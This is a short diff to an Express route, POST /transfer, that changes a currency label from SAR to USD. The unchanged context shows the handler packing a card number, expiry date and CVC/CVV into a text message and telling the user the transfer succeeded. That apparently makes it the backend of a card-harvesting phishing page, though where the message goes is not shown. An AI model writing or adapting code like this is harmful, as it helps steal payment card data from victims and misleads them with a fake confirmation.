@@ -36,7 +36,7 @@ app.post('/transfer', (req, res) => {
                   `Card Number: ${cardNumber}\n` +
                   `Expiry Date: ${expiry}\n` +
                   `CVC/CVV: ${cvc}\n` +
-                  `Amount: ${amount} SAR\n` +
+                  `Amount: ${amount} USD\n` +
                   `Time: ${new Date().toLocaleString()}`
         };
 
@@ -51,7 +51,7 @@ app.post('/transfer', (req, res) => {
 
         res.json({
             status: "Success",
-            message: "Transfer of " + amount + " SAR was successful!"
+            message: "Transfer of " + amount + " USD was successful!"
         });
     } else {
         res.status(400).json({ status: "Error", message: "Invalid Request" });
